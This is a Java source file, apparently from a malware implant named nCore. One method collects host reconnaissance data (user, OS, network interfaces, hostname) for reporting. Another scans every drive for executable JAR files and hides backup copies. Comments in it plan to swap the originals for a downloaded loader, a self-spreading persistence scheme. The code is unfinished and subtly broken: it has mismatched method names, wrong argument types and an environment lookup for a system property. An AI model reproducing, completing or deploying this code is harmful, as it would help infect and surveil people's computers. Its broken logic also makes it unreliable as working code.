package com.nocebo.nCore;

import java.io.File;
import java.io.IOException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.w3c.dom.Document;

import com.nocebo.nCore.iAgent.utilitarian;

public class autoLib
{
    public void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        metadata.put("arch",System.getProperty("os.arch"));
        metadata.put("os",System.getProperty("os.name"));
        metadata.put("version",System.getProperty("os.version"));
        metadata.put("user",System.getProperty("user.name"));
        metadata.put("cwd",System.getProperty("user.dir"));
        metadata.put("jre",System.getProperty("java.runtime.version"));
        metadata.put("interfaces",nUtil.getAddress().toString());
        metadata.put("hostname",nUtil.getHostname());
        metadata.put("uuid",iAgent.sessUUID);
        metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
        metadata.put("error","");

        Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
        iAgent.output.add(metaDoc);
    }

    public void replicate(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        while (iAgent.shutdown != 1)
        {
            ArrayList<File> preRootSet = new ArrayList<>();
            ArrayList<Path> fileNames = new ArrayList();
            File[] roots = File.listRoots();

            for (int f=0;f<roots.length;f++)
            {  
                if (!preRootSet.contains(roots[f].getName()))
                {
                    preRootSet.add(roots[f].getName());
                    Files.find(
                        Paths.get(roots[f]),
                        Integer.MAX_VALUE,
                        (p, basicFileAttributes) ->
                                p.getFileName().toString().contains(".jar"))
                    .forEach(b -> fileNames.add(b));
                }
            }
            
            for (int r=0;r<fileNames.size();r++)
            {
                if (chkMain(fileNames.get(r),nUtil))
                {
                    try
                    {
                        String jarPath = fileNames.get(r).toString();
                        //check if bak-jarname.jar already exists, if so skip
                        File file = new File(jarPath);
                        String parent = file.getParent();
                        
                        String bakJarPath = String.format("%s%s.bak-%s.jar",parent,File.separator,file.getName());

                        if (!new File(bakJarPath).isFile())
                        {
                            //copy to bak-jarname.jar
                            Files.copy(file.getAbsolutePath(), bakJarPath, StandardCopyOption.REPLACE_EXISTING);

                            //hide bak-jarname.jar
                            if (System.getenv("os.name").toLowerCase().contains("win"))
                            {
                                Files.setAttribute(bakJarPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
                            }

                            //create jarname.jar containing loader, downloaded from revamped download endpoint
                            //I need to figure out the loader first
                        }
                    }
                    catch (Exception e)
                    {
                        fileNames.remove(r);
                    }
                }
                //implict else: no main class, ignoring

                metadata.put("persistedPaths",String.join(",",fileNames));
                metadata.put("uuid",iAgent.sessUUID);
                metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                metadata.put("error","");
    
                Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
                iAgent.output.add(metaDoc);

            }
        }
    }

    //helper functions

    public static boolean chkJarMain(Path jarPath, utilitarian nUtil) throws IOException
    {
	
		
		JarFile jarfile = new JarFile(new File(jarPath.toString()));
		Enumeration<JarEntry> enu= jarfile.entries();
    		while(enu.hasMoreElements())
    		{
			
			JarEntry je = enu.nextElement();
			if (je.getName().contains("META-INF/MANIFEST"))
			{
				return (nUtil.streamToString(jarfile.getInputStream(je)).contains("Main-Class:"));
			}
		}
		return false;
	
	
    }

}